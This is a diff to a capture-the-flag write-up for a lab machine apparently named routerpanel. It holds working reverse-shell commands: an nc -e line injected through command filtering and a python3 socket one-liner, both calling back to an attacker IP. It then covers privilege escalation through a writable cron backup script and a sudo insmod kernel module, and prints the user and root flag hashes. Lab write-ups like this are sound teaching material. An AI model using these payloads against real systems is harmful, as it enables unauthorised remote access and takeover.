@@ -101,11 +101,43 @@ Here, we've taken advantage of the bad filtering to execute 'ls -la' command aft
 
 
 Command to execute to get a rev shell :
- nc+10.9.0.156+4444+-e+/bin/bash
+ nc+10.9.1.231+4444+-e+/bin/bash
 
 Now that I have a reverse shell, I stabilized it with python3 :
 
-$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.217",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.231",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 www-data@routerpanel:/$
 
-After some reearch, I found a secret '...' folder hidden in /mnt directory.
+With the help of pspy, we can see that a bash file (/usr/share/backup/backup.sh) is started in an interval of time.
+By navigating to /usr/share/backup/ folder, we can see that we have permissions to write in the backup.sh file.
+
+Perfect, let's inject another reverse shell payload :
+
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF]
+└──╼ [★]$ nc -lnvp 4446
+listening on [any] 4446 ...
+connect to [10.9.1.231] from (UNKNOWN) [10.10.103.199] 43286
+bash: cannot set terminal process group (1600): Inappropriate ioctl for device
+bash: no job control in this shell
+athena@routerpanel:/$
+
+And it worked ! We are now logged as Athena.
+Here is the user flag :
+
+athena@routerpanel:~$ cat user.txt
+857c4a4fbac638afb6c7ee45eb3e1a28
+
+
+By doing a sudo -l command, we can see that we have the root right to inject the venom.ko binary in the kernel. (insmod command)
+After doing some reverse engineering on it, we can see that the binary handle the 'kill' linux process, and permits us to get root on the machine by manipulating 'kill' command.
+
+<image shell4>
+
+<image shell5>
+
+And we are root !
+
+athena@routerpanel:/root$ cat root.txt
+cat root.txt
+aecd4a3497cd2ec4bc71a2315030bd48
